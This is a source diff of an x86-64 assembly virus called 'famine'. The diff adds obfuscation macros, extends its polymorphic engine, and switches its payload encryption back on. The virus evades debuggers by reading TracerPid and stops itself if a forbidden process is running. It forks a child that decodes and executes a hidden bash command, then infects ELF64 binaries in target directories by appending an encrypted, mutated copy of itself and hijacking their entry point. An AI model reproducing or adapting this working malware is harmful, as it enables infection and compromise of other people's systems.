@@ -2,19 +2,24 @@
 
 SECTION .TEXT EXEC WRITE
 global  _start                              ;must be declared for linker (ld)
-
 _start:   ;Entry-Point
+OBF_GENERIC
 PUSH
+OBF_GENERIC
 
 .OUI:
+OBF_GENERIC
 jmp .enc_start
-;DECYPHER
-
+DECYPHER
 
 
 .enc_start:
+.poly_nop_10:
+dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop
+OBF_GENERIC
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
+OBF_GENERIC
 OBF_POLY_1
 .poly_nop_1:
 dd 0x90909090		; this line is to be replaced by random polymorphic instruction equl to 4byte nop
@@ -33,41 +38,52 @@ dq 0x9090909090909090
 dq 0x9090909090909090
 pop rax
 
+OBF_GENERIC
 ;BUILD STRING /proc/self/status FOR OBF
 mov rsi, 0x1E40AEC66F2F
+OBF_GENERIC
 mov rax, 0x1122C0AC0100
 add rsi, rax
 mov qword[rdi], rsi
 add rdi, 6
 mov rsi, 0x500A87BF3341
+OBF_GENERIC
 mov rax, 0x2324DEAD3232
 add rsi, rax
 mov qword[rdi], rsi
 add rdi, 6
 mov rsi, 0x72729481A8
+OBF_GENERIC
 mov rax, 0x0102DFDFCC
 add rsi, rax
 mov qword[rdi], rsi
+OBF_GENERIC
 sub rdi, 12
 
 
+OBF_GENERIC
 mov rsi, O_RDONLY
 mov rax, _open
+OBF_GENERIC
 syscall
 cmp rax, 0
 jl _exx
 
 lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
 mov rdi, rax   ; fd from previous read
+OBF_GENERIC
 mov rdx, 110
 mov rax, _read
+OBF_GENERIC1
 syscall
 cmp rax, 0
 jb _exx_pop
 
 lea r12, STACK(famine.status_str)
 mov r11, 7
+OBF_GENERIC
 .loop_status:
+OBF_GENERIC
 inc r12
 cmp byte[r12], 0x0a
 jne .nope
@@ -75,9 +91,11 @@ dec r11
 cmp r11, 0
 je .check_trcr
 .nope:
+OBF_GENERIC
 loop .loop_status
 
 .check_trcr:
+OBF_GENERIC
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
 jne _exx_pop
@@ -88,6 +106,7 @@ jne _exx_pop
 	xor rdi, rdi
 		dd 0x90909090
 			db 0x90
+OBF_GENERIC
 	lea rdi, STACK(famine.commpath)
 	mov rsi, 0x13203C936162
 	lea rdi, STACK(famine.commpath)
@@ -96,16 +115,19 @@ jne _exx_pop
 	mov qword[rdi], rsi
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
+OBF_GENERIC1
 	syscall
 	test eax, eax
 	jl _exx_pop
 	mov r14, rax
 
 .readdir_proc:
+OBF_GENERIC
 	mov rdx, DIRENT_ARR_SIZE
 	lea rsi, STACK(famine.dirents_proc)
 	mov rdi, r14
 	mov rax, _getdents
+OBF_GENERIC1
 	syscall
 	test rax, rax
 	jle .closedir_proc
@@ -115,6 +137,7 @@ jne _exx_pop
 	jmp .readdir_proc
 
 .closedir_proc:
+OBF_GENERIC
 	mov rdi, r14
 	mov rax, _close
 	syscall
@@ -122,6 +145,7 @@ jne _exx_pop
 
 
 .read_file:
+OBF_GENERIC
 	xor rdi, rdi
 		dd 0x90909090
 			db 0x90
@@ -131,6 +155,7 @@ jne _exx_pop
 	mov al, byte[rdi + rdx - 1]
 	add rdi, dirent.d_name
 	add r13, rdx
+OBF_GENERIC
 	cmp al, DT_DIR
 	jne .nextfile_proc
 
@@ -143,11 +168,13 @@ nop
 nop
 
 .dirname_proc:
+OBF_GENERIC
 	lea rsi, STACK(famine.commpath)
 	mov rax, 0x13203C936162
 	mov r11, 0x1C4332DF0ECD
 	add rax, r11
 	mov qword[rsi], rax
+OBF_GENERIC
 	add r10, 6
 	jb .dirname_proc
 
@@ -156,22 +183,27 @@ nop
 	mov byte[rsi + r10], al
 	inc r10
 	inc rdi
+OBF_GENERIC
 	cmp byte[rdi], 0
 	jne .filename_proc
 
 
 .commfile:
+OBF_GENERIC
 	mov rax, 0x5CAEC3C0FF
 	mov r11, 0x10BEABA230
 	add rax, r11
 	mov qword[rsi + r10], rax
+OBF_GENERIC
 	add r10, 6
 	mov byte[rsi + r10], 0
 
 ;open the commfile
+OBF_GENERIC
 	xor rsi, rsi
 	mov rax, _open
 	lea rdi, STACK(famine.commpath)
+OBF_GENERIC1
 	mov rdx, O_RDWR
 	syscall
 	test eax, eax
@@ -183,16 +215,20 @@ nop
 		dd 0x90909090
 			db 0x90
 	OBF_PUSH_RAX
+OBF_GENERIC
 	mov rdi, rax
 	mov rax, _read
 	lea rsi, STACK(famine.commpath)
 	mov rdx, 90
+OBF_GENERIC1
 	syscall
 	OBF_POP_R9
 	test eax, eax
 	jl .close_proc
 	mov byte[rsi + rax - 1], 0x0
+OBF_GENERIC
 	lea rdi, [rel forbidden]
+OBF_GENERIC
 	call .strcmp
 	cmp rax, 0
 	je .done
@@ -204,35 +240,43 @@ nop
 
 
 .strcmp:
+OBF_GENERIC
 	mov r10b, BYTE [rdi]
 	mov r11b, BYTE [rsi]
+OBF_GENERIC
 	cmp r10b, 0
 	je .end_cmp
 	cmp r11b, 0
 	je .end_cmp
 	cmp r10b, r11b
+OBF_GENERIC
 	jne .end_cmp
 	inc rdi
+OBF_GENERIC
 	inc rsi
 	jmp .strcmp
 
 .end_cmp:
+OBF_GENERIC
 	movzx rax, r10b
 	movzx rbx, r11b
 	sub rax, rbx
 	ret
 
 .done:
+OBF_GENERIC
 	OBF_POP_RDI		; this pop is required in case of Exit from strcmp cause we did a CALL in readdir_proc  and must pop its address
 	jmp _exx_pop
 
 .nextfile_proc:
+OBF_GENERIC
 	cmp r13, r12
 	jl .read_file
 	ret
 
 
 .get_random:
+OBF_GENERIC
 	OBF_PUSH_RDI
 	OBF_PUSH_R9
 	push rsi
@@ -242,8 +286,10 @@ nop
 	OBF_PUSH_R10
 
 	lea rdi, [rel random]
+OBF_GENERIC
 	mov rsi, O_RDONLY
 	mov rax, _open
+OBF_GENERIC1
 	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	.err_ex
@@ -252,9 +298,11 @@ nop
 	mov rax, _read
 	mov rdx, 4
 	lea rsi, STACK(famine.tmp_rand)
+OBF_GENERIC1
 	syscall				; READ 8 RANDOM BYTE<3
 	
 	mov rax, _close
+OBF_GENERIC1
 	syscall
 
 	OBF_POP_R10
@@ -283,17 +331,21 @@ nop
 ;DUREX BLOCK HERE  BETWEEN .DUREX AND .SKIP_DUREX
 .durex:
 ;FORK THE DUREX PROCESS !
+OBF_GENERIC1
 	mov rax, _fork
 	syscall
+OBF_GENERIC
 	cmp rax, 0
 	jne .skip_durex
 
 ;	CLOSE FD 1 AND 2 FOR FORKED  DUREX PROCESS
 	mov rax, _close
 	mov rdi, 1
+OBF_GENERIC1
 	syscall
 	mov rax, _close
 	mov rdi, 2
+OBF_GENERIC1
 	syscall
 
 	lea rdi, STACK(famine.status_str)
@@ -303,6 +355,7 @@ nop
 	add rdi, 3
 	mov rax, 0x687361622f6e
 	mov qword[rdi], rax
+OBF_GENERIC
 	sub rdi, 3
 	mov qword[rsi], rdi
 
@@ -322,90 +375,113 @@ nop
 	mov byte[rax], r10b
 	inc rax
 
+OBF_GENERIC
 	mov r10, 0x627F71E4CF734788
 	mov r11, 0xAEF090990121DF
 	add r10, r11
 	mov qword[rax+8], r10
+OBF_GENERIC
 	mov r10, 0x1338087384BA29D6
 	mov r11, 0x623758FEDC754399
 	add r10, r11
 	mov qword[rax+16], r10
+OBF_GENERIC
 	mov r10, 0x657480C882200252
 	mov r11, 0xFEFE4A9AD123222
 	add r10, r11
 	mov qword[rax+24], r10
+OBF_GENERIC
 	mov r10, 0x58F9FA9117B35E00
 	mov r11, 0x143567DE54AED178
 	add r10, r11
 	mov qword[rax+32], r10
+OBF_GENERIC
 	mov r10, 0x651A41E5BDEFB23E
 	mov r11, 0x1029ED8CA784C123
 	add r10, r11
 	mov qword[rax+40], r10
+OBF_GENERIC
 	mov r10, 0x1FE9D6214E305123
 	mov r11, 0xF45645222442345
 	add r10, r11
 	mov qword[rax], r10
+OBF_GENERIC
 	mov r10, 0x1BAAB6F9EB6664A5
 	mov r11, 0x21CCAA78541200CD
 	add r10, r11
 	mov qword[rax+48], r10
+OBF_GENERIC
 	mov r10, 0x24167B8C5FA63D78
 	mov r11, 0x0909E9E912CDFFFF
 	add r10, r11
 	mov qword[rax+54], r10
+OBF_GENERIC
 	mov r10, 0x5F5C631E0F3E
 	mov r11, 0x742F111111111111
 	add r10, r11
 	mov qword[rax+62], r10
+OBF_GENERIC
 	mov r10, 0x20527BA8C39CA60E
 	mov r11, 0x5412EDCCAD908712
 	add r10, r11
 	mov qword[rax+70], r10
+OBF_GENERIC
 	mov r10, 0x425B84450C07D917
 	mov r11, 0x3409DFEA14675409
 	add r10, r11
 	mov qword[rax+78], r10
+OBF_GENERIC
 	mov r10, 0xEBAA7DC5A415D1E
 	mov r11, 0x1165789012341111
 	add r10, r11
 	mov qword[rax+86], r10
+OBF_GENERIC
 	mov r10, 0x1A0A262C437B24DB
 	mov r11, 0x55634236DCAB0145
 	add r10, r11
 	mov qword[rax+94], r10
+OBF_GENERIC
 	mov r10, 0x73FCDA4A89A6B921
 	mov r11, 0x3245ECAD906743
 	add r10, r11
 	mov qword[rax+102], r10,
+OBF_GENERIC
 	mov r10, 0xEE0591FED833C10
 	mov r11, 0x1145CD0086AC345D
 	add r10, r11
 	mov qword[rax+110], r10
+OBF_GENERIC
 	mov r10, 0x1CB03BEFFFD03BF
 	mov r11, 0x7070707070707070
 	add r10, r11
 	mov qword[rax+118], r10
+OBF_GENERIC
 	mov r10, 0x55522D191E1C52C0
 	mov r11, 0x1EDD43545612CDAD
 	add r10, r11
 	mov qword[rax+126], r10
+OBF_GENERIC
 	mov qword[rsi+24], 0x0
 	mov rdx, 0
 	mov rax, 59
+OBF_GENERIC1
 	syscall
 	.skip_durex:
 
+OBF_GENERIC
 	mov rax, _fork
+OBF_GENERIC1
 	syscall
 	cmp rax, 0
 	jne _exx_pop
 
 lea rdi, [rel infect_dir] ; load dir str
 .opendir:
+OBF_GENERIC
 	mov r14, rdi
 	mov rsi, O_RDONLY | O_DIRECTORY
 	mov rax, _open
+OBF_GENERIC1
 	syscall				;	open directory
 	test eax, eax
 	jl .nextdir
@@ -415,9 +491,11 @@ lea rdi, [rel infect_dir] ; load dir str
 dd 0x90909090
 .readdir:
 	mov rdx, DIRENT_ARR_SIZE
+OBF_GENERIC
 	lea rsi, STACK(famine.dirents)
 	mov rdi, STACK(famine.dir_fd)
 	mov rax, _getdents
+OBF_GENERIC1
 	syscall				;	get directory entries
 	test  rax,rax
 	jle .closedir		;	no more entries
@@ -433,6 +511,7 @@ dq 0x9090909090909090
 pop rax
 
 .file:
+OBF_GENERIC
 	; check directory entry for a regular file
 	lea rdi, STACK(famine.dirents)
 	add rdi, r13
@@ -440,21 +519,25 @@ pop rax
 	mov al, byte[rdi + rdx - 1]
 	add rdi, dirent.d_name
 	add r13, rdx
+OBF_GENERIC
 	cmp al, DT_REG
 	jne .nextfile
 	call process		; process the file
 
 .nextfile:
+OBF_GENERIC
 	cmp r13, r12		; check if directory entry looping is over 
 	jl .file
 	jmp .readdir		; read dir for more entry
 
 .closedir:
+OBF_GENERIC
 	mov rdi, STACK(famine.dir_fd)
 	mov rax, _close
 	syscall
 
 .nextdir:
+OBF_GENERIC
 	mov ecx, 0
 	mul ecx
 	dec ecx
@@ -466,18 +549,21 @@ pop rax
 	jmp _exx.exit		;jump to the end
 
 process:
+OBF_GENERIC
 	mov rsi, r14  ; r14 hold infect dir
 	mov rax, rdi
 	lea rdi, STACK(famine.file_path)  ; load stack addr to store file_path
 	mov rdx, rdi
 
 .dirname:
+OBF_GENERIC
 	movsb			; load dirname to rdi
 	cmp byte [rsi], 0
 	jnz .dirname
 	mov rsi, rax
 
 .filename:
+OBF_GENERIC
 	movsb			; append filename to dirname to get full path
 	cmp byte[rsi - 1], 0
 	jnz .filename
@@ -485,6 +571,7 @@ process:
 				;open file
 	mov rsi, O_RDWR
 	mov rax, _open
+OBF_GENERIC1
 	syscall			; open
 
 
@@ -492,10 +579,12 @@ process:
 	jl .return
 	mov STACK(famine.file_fd), rax		; save result from open to stack
 
+OBF_GENERIC
 				;stat
 	lea rsi, STACK(famine.stat)
 	mov rdi, rax
 	mov rax, _fstat
+OBF_GENERIC1
 	syscall
 	cmp rax, 0
 	jnz .close
@@ -506,6 +595,7 @@ process:
 				;MMAP file
 	mov r9, 0
 	mov r8, STACK(famine.file_fd)  ; restore file_fd
+OBF_GENERIC
 	mov r10, MAP_SHARED
 	mov rdx, PROT_READ | PROT_WRITE
 	.poly_xor_rdi_1:
@@ -515,9 +605,11 @@ process:
 	mov rax, _mmap
 	syscall
 
+OBF_GENERIC
 	cmp rax, MMAP_ERRORS
 	jae .close
 	
+OBF_GENERIC
 	mov STACK(famine.file_data), rax	; save mmap to file from rax to stack
 	mov rdi, rax						; 
 	call check_elf64
@@ -526,12 +618,14 @@ process:
 	call inject_self
 
 .unmap:
+OBF_GENERIC
 	mov rsi, STACK(famine.file_size)
 	mov rdi, STACK(famine.file_data)
 	mov rax, _munmap
 	syscall
 
 .close:
+OBF_GENERIC
 	mov rdi, STACK(famine.file_fd)
 	mov rax, _close
 	syscall
@@ -540,6 +634,7 @@ process:
 	ret
 
 check_elf64:
+OBF_GENERIC
 	xor rax, rax
 	cmp qword[rdi+8], rax
 	jnz .return
@@ -551,6 +646,7 @@ check_elf64:
 	jnz .return
 
 .continue:
+OBF_GENERIC
 	mov rdx, _DYN_
 	cmp qword[rdi + 16], rdx  ; DYN
 	jz .ok
@@ -558,11 +654,14 @@ check_elf64:
 	cmp qword[rdi + 16], rdx	; EXEC
 	jnz .return
 .ok:
+OBF_GENERIC
 	inc rax
 .return:
+OBF_GENERIC
 	ret
 
 inject_self:
+OBF_GENERIC
 	push r13		; save registers in case we need to restore 
 	OBF_OVERWRITE_PUSHR14R15
 
@@ -579,6 +678,7 @@ inject_self:
 	mov r14, rdi  ; save phdr[0] offset to r14
 
 	.segment:
+OBF_GENERIC
 	cmp rcx, 0
 	jl .return
 	mov ax, SEGMENT_TYPE
@@ -588,11 +688,13 @@ inject_self:
 	jmp .infect
 
 	.next:
+OBF_GENERIC
 	add rdi, elf64_phdr_size  ; add phdr size to rdi to loop through pheaders
 	dec rcx					  ; decrement phnum
 	jmp .segment
 
 	.infect:
+OBF_GENERIC
 	OBF_PUSH_RDI ; save phdr to infect offset to  stack
 
 .get_rand_key:
@@ -601,6 +703,7 @@ inject_self:
 			db 0x90
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
+OBF_GENERIC
 	mov rax, _open
 .poly_push_ops_pop3:
 push rax
@@ -609,6 +712,7 @@ push rax
 	dq 0x9090909090909090
 	dq 0x9090909090909090
 pop rax
+OBF_GENERIC1
 	syscall					; OPEN /dev/urandom  EXIT if not work
 	cmp rax, 0
 	jl	_exx_pop
@@ -618,6 +722,7 @@ pop rax
 	mov rax, _read
 	mov rdx, 2
 	lea rsi, STACK(famine.key)
+OBF_GENERIC1
 	syscall				; READ 2 byte, 1 for key, 1 for derivate
 	
 	OBF_POP_RAX
@@ -625,11 +730,14 @@ pop rax
 	mov rax, _read
 	mov rdx, 1
 	lea rsi, STACK(famine.factor)
+OBF_GENERIC1
 	syscall				; READ 2 byte, 1 for key, 1 for derivate
 	mov rax, _close
+OBF_GENERIC1
 	syscall
 
 ; get target End of file
+OBF_GENERIC
 	mov rdi, STACK(famine.file_fd) ; target fd to rdi
 	mov rsi, 0 ; offset 0
 	mov rdx, END_SEEK
@@ -650,11 +758,13 @@ pop rax
 	pop r13
 	sub r13, .delta
 	
+OBF_GENERIC
 	; load cypher and write v
 	lea rsi, [r13 + _start] ; load _start addr to rsi
 	mov rdx, _end - _start  ; virus size to rdx
 	lea r10, STACK(famine.tocypher)  ; r10 hold future v-location in stack
 	.loading_v:
+OBF_GENERIC
 		mov r11b, byte[rsi]
 		mov [r10], r11b
 		inc rsi
@@ -664,12 +774,14 @@ pop rax
 		jg .loading_v
 
 
+OBF_GENERIC
 	lea r10, STACK(famine.tocypher)
 	add r10,JUMP_DECYPHER_OFFSET
 	mov byte[r10], 0
 
 	;try and build array of offset to poly_nop
 	;POLY NOP SETUP
+OBF_GENERIC
 	.poly_xor_r11_1:
 	xor r11, r11
 	nop
@@ -678,6 +790,7 @@ pop rax
 	nop
 	nop
 	
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_NOP_1_OFFSET
 	mov qword[r10+8], POLY_NOP_2_OFFSET
@@ -688,7 +801,8 @@ pop rax
 	mov qword[r10+48], POLY_NOP_7_OFFSET
 	mov qword[r10+56], POLY_NOP_8_OFFSET
 	mov qword[r10+64], POLY_NOP_9_OFFSET
-	mov word[r10+72], 0x1111
+	mov qword[r10+72], POLY_NOP_10_OFFSET
+	mov word[r10+80], 0x1111
 	mov r11, POLY_NOP_NUMBER	; the number of possible polymorphic intrustions 
 	mov r9, POLY_NOP_SIZE	; the size of instruction replaced (equal to the size of replacing one)
 	lea rsi, [rel poly_nop]
@@ -699,6 +813,7 @@ pop rax
 
 	;THE FUNCTION NEED : r10 ARRAY OF OFFSETS TO REPLACE WITH THIS POLY SET  - r11 REPRESENT NUMBER OF POSSIBLE POLY INTRSUCTIONS - r9 HAS TO BE EQUAL TO THE SIZE TO REPLACE - RSI = lea rsi, [rel LOCATION OF POLY INTRUCTIONS]
 	.poly_engine:
+OBF_GENERIC
 	call _start.get_random
 	push rsi
 	lea rcx, STACK(famine.tocypher)
@@ -707,21 +822,25 @@ pop rax
 	xor rdi, rdi
 	dd 0x90909090
 	db 0x90
+OBF_GENERIC
 	mov dil, byte STACK(famine.tmp_rand)
 	cmp rdi, r11
 	jl .moddone
 	.mod:
+OBF_GENERIC
 	sub dil, r11b
 	cmp rdi, r11
 	jge .mod
 	.moddone:
 	mov rax, r9
+OBF_GENERIC
 	mul di
 	mov dil, al
 	add rsi, rdi
 	push r11
 	OBF_PUSH_R9
 	.looping:
+OBF_GENERIC
 	mov r11b, byte[rsi]
 	mov byte[rcx], r11b
 	inc rsi
@@ -735,6 +854,7 @@ pop rax
 	add r10, 0x8	; SWITCH TO NEXT OFFSET TO REPLACE ON THE OFFSET TABLE
 	cmp word[r10], 0x1111
 	jne .poly_engine
+OBF_GENERIC
 	ret
 	;END OF POLY ENGINE 
 
@@ -742,6 +862,7 @@ pop rax
 	xor r11, r11
 	dd 0x90909090
 	db 0x90
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_XOR_R10_1_OFFSET
 	mov qword[r10+8], POLY_XOR_R10_2_OFFSET
@@ -755,10 +876,12 @@ pop rax
 	xor r11, r11
 	dd 0x90909090
 	db 0x90
+OBF_GENERIC
 	xor r9, r9
 	mov rsi, 0x8
 	
 	.poly_inc_r10:
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10+r11], POLY_INC_R10_1_OFFSET
 	add qword[r10+r11], r9
@@ -777,6 +900,7 @@ pop rax
 	xor r11, r11
 		dd 0x90909090
 		db 0x90
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_XOR_R11_1_OFFSET
 	mov qword[r10+8], POLY_XOR_R11_2_OFFSET
@@ -794,6 +918,7 @@ pop rax
 	xor r11, r11
 		dd 0x90909090
 			db 0x90
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_XOR_RDI_1_OFFSET
 	mov qword[r10+8], POLY_XOR_RDI_2_OFFSET
@@ -813,6 +938,7 @@ pop rax
 	xor r11, r11
 		dd 0x90909090
 			db 0x90
+OBF_GENERIC
 	lea r10, STACK(famine.poly_offsets)
 	mov qword[r10], POLY_PUSH_POP_1_OFFSET
 	mov qword[r10+8], POLY_PUSH_POP_1_OFFSET
@@ -841,15 +967,17 @@ pop rax
 	lea rsi, [rel poly_8byte_rax_ops]
 	call .poly_engine
 
-;	lea r10, STACK(famine.tocypher)
-;	add r10, KEY_OFFSET
-;	mov r11b, STACK(famine.key)
-;	mov byte[r10], r11b
+OBF_GENERIC
+	lea r10, STACK(famine.tocypher)
+	add r10, KEY_OFFSET
+	mov r11b, STACK(famine.key)
+	mov byte[r10], r11b
 
-;	lea r10, STACK(famine.tocypher)
-;	add r10, FACTOR_OFFSET
-;	mov r11b, STACK(famine.factor)
-;	mov byte[r10], r11b
+OBF_GENERIC
+	lea r10, STACK(famine.tocypher)
+	add r10, FACTOR_OFFSET
+	mov r11b, STACK(famine.factor)
+	mov byte[r10], r11b
 
 	push r12
 	xor r12, r12
@@ -894,22 +1022,27 @@ pop rax
 	mov r12b, byte STACK(famine.tmp_rand)		;load random val 
 	add byte[r10], r12b							;add random val to last signature byte
 	.done_finger:
+OBF_GENERIC
 	mov STACK(famine.morph_sign_u), r11	;	save current signature state
 	mov STACK(famine.morph_sign_d), r12	;	save current signature state
 
 	call _start.get_random
+OBF_GENERIC
 	lea r10,STACK(famine.tocypher)
 	add r10, POLY_OFFSET_1
 	mov r12, STACK(famine.tmp_rand)
 	mov dword[r10], r12d
 
 	call _start.get_random
+OBF_GENERIC
 	lea r10, STACK(famine.tocypher)
 	add r10, POLY_CRAP_SKIPPED_OFFSET
 	mov rsi, 7
 
 	.patch_poly_crap:
+OBF_GENERIC
 	call _start.get_random
+OBF_GENERIC
 	mov r12, STACK(famine.tmp_rand)
 	mov dword[r10], r12d
 	add r10, 4
@@ -917,9 +1050,10 @@ pop rax
 	cmp rsi, 0
 	jne .patch_poly_crap
 
-;CYPHER
+CYPHER
 	pop r12
 
+OBF_GENERIC
 	mov rdi, STACK(famine.file_fd) ; fd to rdi
 	lea rsi, STACK(famine.tocypher)
 	mov rdx, _end - _start  ; virus size to rdx
@@ -931,6 +1065,7 @@ pop rax
 	jbe .return
 
 	.edit_phdr:
+OBF_GENERIC
 	OBF_POP_RAX				;RDI = the offset of patched PHEADER
 	OBF_POP_RDI
 	OBF_PUSH_RDI
@@ -951,6 +1086,7 @@ pop rax
 	add qword [rdi + 40], _end - _start + 5
 
 	.edit_ehdr:
+OBF_GENERIC
 	mov rdi, STACK(famine.file_data)
 	mov r14, [rdi + elf64_ehdr.e_entry ] ; save original e_entry to r14
 	mov [rdi + elf64_ehdr.e_entry], r13 ; set ehdr.e_entry to vaddr of injected
@@ -968,6 +1104,7 @@ pop rax
 	xor rdi, rdi
 		dd 0x90909090
 			db 0x90
+OBF_GENERIC
 	mov rdi , STACK(famine.file_fd)
 	mov rsi, 0
 	mov rdx, END_SEEK
@@ -990,9 +1127,11 @@ pop rax
 	sub rax, RETURN_JUMP_OFFSET  ; offset between _end:  and jump .exit
 	mov r10, rax ; EOF From last call to lseek
 	mov rax, _pwrite
+OBF_GENERIC1
 	syscall
 
 	mov rax, _sync
+OBF_GENERIC1
 	syscall
 	
 	jmp .return
@@ -1006,6 +1145,7 @@ pop rax
 		ret
 
 
+OBF_GENERIC
 ;POLYMORPHIC 4 BYTE NOP WITH DIFFERENT OPCODE
 poly_nop:	add r10, 0
 			add r15, 0
@@ -1021,6 +1161,7 @@ poly_nop:	add r10, 0
 				db 0x90
 
 
+OBF_GENERIC
 ; POLYMORPHIC 6 BYTE xor r10, r10 WITH IFFERENT OPCODES
 poly_xor_r10_r10:	push 0
 					pop r10
@@ -1046,6 +1187,7 @@ poly_xor_r10_r10:	push 0
 					mov r10d, 0
 
 
+OBF_GENERIC
 poly_xor_rdi_rdi:	push 0
 					pop rdi
 						.poly_nop_10:
@@ -1072,6 +1214,7 @@ poly_xor_rdi_rdi:	push 0
 
 
 
+OBF_GENERIC
 poly_xor_r11_r11:	push 0
 						pop r11
 						.poly_nop_6:
@@ -1094,6 +1237,7 @@ poly_xor_r11_r11:	push 0
 					mov r11, 0
 						dw 0x9090
 
+OBF_GENERIC
 ; POLYMORPHIC 8BYTE inc r10
 poly_inc_r10:	inc r10
 					.poly_nop_4:
@@ -1113,6 +1257,7 @@ poly_inc_r10:	inc r10
 				add r10, 0x32
 				sub r10, 0x31
 
+OBF_GENERIC
 poly_8byte_rax_ops:
 						add rax, 150
 							push rdi
